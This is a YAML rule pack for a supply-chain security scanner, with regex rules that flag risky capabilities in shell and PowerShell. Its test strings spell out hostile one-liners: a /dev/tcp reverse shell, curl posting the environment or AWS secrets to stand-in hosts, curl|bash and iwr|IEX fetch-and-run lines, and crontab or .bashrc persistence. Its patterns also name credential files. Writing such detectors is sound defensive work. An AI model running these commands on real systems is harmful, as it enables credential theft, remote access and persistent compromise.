pack:
  id: cordon.capabilities.shell
  version: 0.1.0
  license: Apache-2.0
  source: cordon-builtin
  description: >
    Capability primitives for shell and PowerShell.

    Shell deserves particular attention because it is the language install
    hooks, CI steps and container builds are written in, so it sits closest to
    the moment a supply-chain attack actually executes. It is also the language
    where the primitives are least separable: a single line routinely decodes,
    fetches and executes at once.

rules:
  - id: CAP.SH.DECODE.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: decode
    title: Decodes encoded data
    message: >
      This script decodes base64 or hex data. Ordinary alone; it matters when the
      result is then executed, because that is how a payload avoids appearing in
      the script at all.
    remediation: >
      No action for this signal alone. Review it if the decoded value is executed
      or written somewhere that will be.
    languages: [shell, powershell, makefile]
    match:
      kind: regex
      patterns:
        - '\bbase64\s+(?:-d|--decode|-D)\b'
        - '\bopenssl\s+(?:enc|base64)\b[^\n]*-d\b'
        - '\bxxd\s+-r\b'
        - '\bFromBase64String\s*\('
    tests:
      positive:
        - "echo $BLOB | base64 -d > /tmp/x"
        - "$d = [Convert]::FromBase64String($b)"
      negative:
        - "base64 /etc/hostname > encoded.txt"
        - "# base64 encoding is handled upstream"

  - id: CAP.SH.EXECUTE.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: execute
    title: Executes a string as code
    message: >
      This script evaluates a string as shell code. Whatever the string contains
      at runtime is what runs, so the script's behaviour is not determined by
      what the file says.
    remediation: >
      Replace the evaluation with a direct command. If a command must be chosen
      at runtime, select from a fixed set rather than assembling it.
    languages: [shell, powershell, makefile]
    match:
      kind: regex
      patterns:
        - '\beval\s+'
        - '^\s*\.\s+/dev/stdin'
        - '\bsource\s+/dev/stdin'
        - '\bInvoke-Expression\b|\biex\s+'
        - '\bpowershell\b[^\n]*-(?:enc|EncodedCommand)\b'
    tests:
      positive:
        - "eval \"$CMD\""
        - "iex (New-Object Net.WebClient).DownloadString($u)"
        - "powershell -enc SQBFAFgA"
      negative:
        - "# evaluate the results below"
        - "make evaluate"

  - id: CAP.SH.SPAWN.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: medium
    capability: spawn
    title: Starts a subshell or another process
    message: >
      This script starts another process. Ubiquitous in shell, which is why this
      is only a label; it becomes meaningful in combination with fetching or
      decoding.
    remediation: >
      No action for this signal alone.
    languages: [shell, powershell, makefile]
    # Measured over corpus/benign, not asserted. A primitive that
    # matched nothing benign would be a primitive that does not work.
    baseline_hits: 3
    match:
      kind: regex
      patterns:
        - '\$\([^)]{2,}\)'
        - '`[^`]{2,}`'
        - '\b(?:ba|z|k)?sh\s+-c\b'
        - '\bStart-Process\b'
        - '\bnohup\b|\bsetsid\b'
        # A pipe into an interpreter. This was absent, so `curl ... | bash` --
        # the single most recognisable line in the supply-chain attack
        # literature -- produced no spawn label, left the egress label with no
        # partner, and fired no composite. It was caught inside a Dockerfile or
        # a workflow by a path-scoped rule, and missed in the plain `.sh`
        # install script where it actually lands.
        - '\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b'
        - '\|\s*(?:sudo\s+)?python[0-9.]*\b'
        - '\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b'
        - '\|\s*(?:sudo\s+)?tee\s'
        - '\bIEX\b|\bInvoke-Expression\b'
    tests:
      positive:
        - "output=$(uname -a)"
        - "sh -c 'echo hi'"
        - "curl -sSL https://example.invalid/x | bash"
        - "wget -qO- https://example.invalid/x | sudo sh"
        - "curl https://example.invalid/x | python3"
      negative:
        - "echo 'plain text'"
        - "VERSION=1.2.3"
        - "cat file | grep pattern"
        - "ls | wc -l"

  - id: CAP.SH.CREDENTIAL.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: medium
    capability: credential
    title: Reads credentials or the environment
    message: >
      This script reads key material, cloud credentials, or the environment as a
      whole. Dumping the environment is the fastest way to collect every secret a
      CI job or an install hook was given.
    remediation: >
      Reference named variables rather than dumping the environment, and never
      read another tool's credential file.
    languages: [shell, powershell, makefile]
    evidence_policy: hash_only
    match:
      kind: regex
      patterns:
        # Bare `env` only. `env NAME=value cmd` is the env-prefix form and is
        # entirely ordinary; the signal is `env` with nothing after it, which is
        # the form that dumps every variable at once.
        - '^[^#\n]*(?:^|[;&|`$(])\s*env\s*(?:$|[;&|)])'
        - '\bprintenv\b'
        - '\bGet-ChildItem\s+Env:'
        - '\.ssh/id_|\.aws/credentials|\.npmrc|\.netrc|\.docker/config\.json'
        - '\bkubectl\s+get\s+secret'
        # A *named* secret variable. Only whole-environment dumps were matched,
        # and reading `$AWS_SECRET_ACCESS_KEY` or `$GITHUB_TOKEN` directly is
        # the dominant form in CI -- the one an exfiltration script actually
        # uses, because it is shorter and less conspicuous than dumping
        # everything.
        - '\$\{?[A-Za-z_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|APIKEY|API_KEY|CREDENTIAL|PRIVATE_KEY)[A-Za-z_]*\}?'
        - '\$\{?(?:AWS_ACCESS_KEY_ID|GH_TOKEN|CI_JOB_TOKEN|TWINE_PASSWORD)\}?'
        - '\bEnv:[A-Za-z_]*(?:TOKEN|SECRET|PASSWORD|KEY)'
    tests:
      positive:
        - "curl -d \"$(env)\" https://x.example"
        - "cat ~/.aws/credentials"
        - "curl -d \"$AWS_SECRET_ACCESS_KEY\" https://x.example"
        - "echo $GITHUB_TOKEN | base64"
        - "curl -H \"Authorization: $NPM_TOKEN\" https://x.example"
      negative:
        - "env NODE_ENV=production npm run build"
        - "environment=staging"

  - id: CAP.SH.EGRESS.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: egress
    title: Opens an outbound network connection
    message: >
      This script transfers data over the network. Expected in an installer;
      unexpected in an install hook that is meant only to compile something.
    remediation: >
      Confirm the destination is a fixed, known host rather than one assembled at
      runtime.
    languages: [shell, powershell, makefile]
    match:
      kind: regex
      patterns:
        # `[^#\n]*` anchors the match to a line with no preceding comment
        # marker. A script that documents "curl is not used here" is not egress,
        # and comments are the largest false-positive source in shell.
        - '^[^#\n]*\bcurl\s'
        - '^[^#\n]*\bwget\s'
        # Bounded repetition on purpose: `(?:-[a-z]+\s+)*` nests an unbounded
        # quantifier inside another, which is the classic backtracking shape.
        - '\bnc\s+(?:-[a-z]+\s+){0,4}\S+\s+\d+'
        - '/dev/tcp/'
        - '\bInvoke-WebRequest\b|\bDownloadString\b|\bDownloadFile\b'
        - '\bscp\s|\brsync\s'
    tests:
      positive:
        - "curl -sSL https://example.com/x.sh"
        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
      negative:
        - "echo 'no network here'"
        - "# curl is not used in this script"

  - id: CAP.SH.PERSIST.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: persist
    title: Installs something that survives a restart
    message: >
      This script writes to a shell profile, a scheduled task or a service
      definition. These are the standard footholds for code that intends to run
      again after the process that installed it has exited.
    remediation: >
      Confirm this is a deliberate installer action and that the content written
      is fixed rather than fetched.
    languages: [shell, powershell, makefile]
    match:
      kind: regex
      patterns:
        - '>>\s*[^\n]*\.(?:bashrc|bash_profile|zshrc|profile)\b'
        - '\bcrontab\s+-|/etc/cron\.[a-z]+/'
        - '\bsystemctl\s+enable\b|/etc/systemd/system/'
        - '\blaunchctl\s+load\b|LaunchAgents|LaunchDaemons'
        - '\bRegister-ScheduledTask\b|\bschtasks\s+/create\b'
        - 'CurrentVersion\\\\Run'
    tests:
      positive:
        - "echo 'curl x|sh' >> ~/.bashrc"
        - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
      negative:
        - "systemctl status nginx"
        - "cat ~/.bashrc"

  # ---------------------------------------------------------------------
  # Fetch-execute adjacency
  # ---------------------------------------------------------------------
  - id: CAP.SH.FETCH_EXEC.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: fetch_exec
    title: Downloaded content is piped straight into an interpreter
    message: >
      The output of a download is the input of an interpreter. Unlike a file
      that happens to fetch something and separately run something, this is one
      construct: what runs is whatever the remote host served at that moment,
      and nothing about it is captured by review, by a lockfile, or by any
      artefact this repository controls.
    remediation: >
      Download to a file, verify it against a known digest, and run it as a
      separate step that a reader can see.
    languages: [shell, powershell, makefile]
    baseline_hits: 0
    match:
      kind: regex
      patterns:
        # Fetch on the left of the pipe, interpreter on the right. Anchored on
        # both halves so an ordinary `ps | grep` or `cat x | sh` -- which is not
        # a network fetch -- does not label.
        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b'
        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?python[0-9.]*\b'
        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b'
        - '\b(?:Invoke-WebRequest|iwr|curl)\b[^|\n]{0,200}\|\s*(?:IEX|Invoke-Expression)\b'
    tests:
      positive:
        - "curl -sSL https://example.invalid/x | bash"
        - "wget -qO- https://example.invalid/x | sudo sh"
        - "curl https://example.invalid/x | python3"
        - "iwr https://example.invalid/x | IEX"
      negative:
        - "ps aux | grep nginx"
        - "cat script.sh | sh"
        - "curl -sSL https://example.invalid/x -o /tmp/x"
        - "echo hello | tee /tmp/log"
